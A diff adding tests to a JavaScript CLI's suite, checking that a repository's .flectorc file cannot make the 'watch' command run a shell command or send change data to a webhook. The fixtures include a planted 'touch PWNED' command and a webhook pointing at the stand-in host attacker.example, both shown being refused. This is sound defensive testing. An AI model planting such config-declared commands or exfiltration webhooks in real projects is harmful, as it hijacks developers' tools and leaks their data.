@@ -12,9 +12,29 @@ import {
 } from 'fs';
 import { join, resolve } from 'path';
 import { tmpdir } from 'os';
-import { spawnSync } from 'child_process';
+import { spawn, spawnSync } from 'child_process';
 
 const rootIndex = resolve(process.cwd(), 'index.js');
+
+/**
+ * Kill a spawned CLI process and wait for it to be gone, so teardown never
+ * races a still-exiting process for the directory it was running in (Windows
+ * refuses to remove a directory a live process still holds open).
+ * @param {import('child_process').ChildProcess | undefined | null} child
+ * @param {number} timeoutMs
+ */
+async function stopChild(child, timeoutMs = 5000) {
+  if (!child) return;
+  if (child.exitCode !== null || child.signalCode !== null) return;
+  child.kill();
+  await new Promise((done) => {
+    const timer = setTimeout(done, timeoutMs);
+    child.once('exit', () => {
+      clearTimeout(timer);
+      done();
+    });
+  });
+}
 
 /**
  * A project a hostile pull request could produce: a config file, a baseline, a
@@ -722,6 +742,201 @@ describe('the merge gate cannot be turned green from .flectorc (#121)', () => {
       assert.ok(existsSync(join(dir, 'accepted.json')));
     } finally {
       rmSync(dir, { recursive: true, force: true });
+    }
+  });
+});
+
+describe('watch cannot be turned into a shell command or a webhook from .flectorc (#121)', () => {
+  // `watch --command` spawns a shell command on every change, and `--webhook`
+  // POSTs the same change data to a URL. Both merge through
+  // resolveEffectiveOptions with no other gate, so before this suite's fix a
+  // pull request that only added `.flectorc` got either one on the next
+  // `flecto watch` -- no `--command`/`--webhook` flag required.
+
+  /**
+   * A repo whose `.flectorc` declares an alert action, the same shape a pull
+   * request could commit.
+   * @param {Record<string, unknown>} [rc]
+   * @param {{ profile?: string }} [opts]
+   */
+  function hostileWatchRepo(rc, opts = {}) {
+    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-alert-')));
+    writeFileSync(join(dir, 'config.json'), JSON.stringify({ a: 1 }), 'utf8');
+    if (rc) {
+      const body = opts.profile ? { profiles: { [opts.profile]: rc } } : { defaults: rc };
+      writeFileSync(join(dir, '.flectorc'), JSON.stringify(body), 'utf8');
+    }
+    return dir;
+  }
+
+  test('a command declared in .flectorc is refused, not run', () => {
+    // --snapshot exits after one pass rather than looping, so a fix regression
+    // (the guard not firing) fails this test instead of hanging it -- the
+    // command would only ever run from the *next* file change in real usage,
+    // never from the snapshot pass itself.
+    const dir = hostileWatchRepo({ command: 'touch PWNED' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 1);
+      assert.match(run.stderr, /Refusing "command" declared in \.flectorc/);
+      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
+      assert.ok(!existsSync(join(dir, 'PWNED')), 'the command never ran');
+      assert.ok(!existsSync(join(dir, '.flecto-snapshots')), 'refused before doing anything else');
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('a webhook declared in .flectorc is refused the same way', () => {
+    const dir = hostileWatchRepo({ webhook: 'http://attacker.example/collect' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 1);
+      assert.match(run.stderr, /Refusing "webhook" declared in \.flectorc/);
+      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('a webhookHeader declared in .flectorc is refused even when --webhook is on the command line', () => {
+    // command/webhook themselves being operator-approved doesn't extend that
+    // approval to the headers riding along on the request -- an rc-declared
+    // header can still override Content-Type or the dedup headers on a webhook
+    // call the operator otherwise trusts.
+    const dir = hostileWatchRepo({ webhookHeader: ['Content-Type: text/plain'] });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot', '--webhook', 'https://ops.example.com/hook'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 1);
+      assert.match(run.stderr, /Refusing "webhookHeader" declared in \.flectorc/);
+      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('--webhook-header on the command line is untouched', () => {
+    const dir = hostileWatchRepo(null);
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [
+          rootIndex, 'watch', 'config.json', '--snapshot',
+          '--webhook', 'https://ops.example.com/hook', '--webhook-header', 'Content-Type: text/plain',
+        ],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 0, run.stderr);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('onAlertFailure and deliveryMode are settings, not actions, and stay usable from .flectorc', () => {
+    // flecto init writes these into the generated .flectorc itself (see
+    // docs/configuration.md) -- they only tune how an already-chosen alert
+    // responds to failure, the same "operator delegates a setting" shape
+    // failOn already has, so they are deliberately not in ALERT_ACTION_OPTIONS.
+    const dir = hostileWatchRepo({ onAlertFailure: 'exit', deliveryMode: 'at-least-once' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 0, run.stderr);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('a profile is not a way around it either', () => {
+    const dir = hostileWatchRepo({ command: 'touch PWNED' }, { profile: 'ci' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot', '--profile', 'ci'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000 },
+      );
+      assert.equal(run.status, 1);
+      assert.match(run.stderr, /Refusing "command" declared in \.flectorc/);
+      assert.ok(!existsSync(join(dir, 'PWNED')));
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('FLECTO_ALLOW_RC_ALERTS=1 opts back in, for a repository that means it', () => {
+    const dir = hostileWatchRepo({ command: 'touch PWNED' });
+    try {
+      const run = spawnSync(
+        process.execPath,
+        [rootIndex, 'watch', 'config.json', '--snapshot'],
+        { cwd: dir, encoding: 'utf8', timeout: 5000, env: { ...process.env, FLECTO_ALLOW_RC_ALERTS: '1' } },
+      );
+      assert.equal(run.status, 0, run.stderr);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  test('--command on the command line still fires on a real change, because it is the operator', async () => {
+    const dir = hostileWatchRepo(null);
+    // Written portably as a node one-liner, matching the pattern the alerter's
+    // own functional suite uses (cli.test.js) — `touch` is not on PATH on the
+    // windows-24 CI leg, only inside a shell configured with coreutils.
+    const marker = join(dir, 'RAN');
+    let child;
+    try {
+      await new Promise((ready, reject) => {
+        child = spawn(
+          process.execPath,
+          [
+            rootIndex, 'watch', 'config.json', '--polling', '--interval', '25',
+            '--command', `"${process.execPath}" -e "require('fs').writeFileSync(process.env.FLECTO_TEST_MARKER,'')"`,
+          ],
+          { cwd: dir, env: { ...process.env, FLECTO_TEST_MARKER: marker } },
+        );
+        let poll;
+        const timeout = setTimeout(() => {
+          clearInterval(poll);
+          reject(new Error('command never ran within 10s'));
+        }, 10_000);
+        let watching = false;
+        child.stdout.on('data', (chunk) => {
+          if (!watching && chunk.toString().includes('flecto watching')) {
+            watching = true;
+            setTimeout(() => writeFileSync(join(dir, 'config.json'), JSON.stringify({ a: 2 }), 'utf8'), 100);
+          }
+        });
+        poll = setInterval(() => {
+          if (!existsSync(marker)) return;
+          clearInterval(poll);
+          clearTimeout(timeout);
+          ready();
+        }, 50);
+        child.on('error', (err) => {
+          clearInterval(poll);
+          clearTimeout(timeout);
+          reject(err);
+        });
+      });
+      assert.ok(existsSync(marker));
+    } finally {
+      await stopChild(child);
+      rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
     }
   });
 });
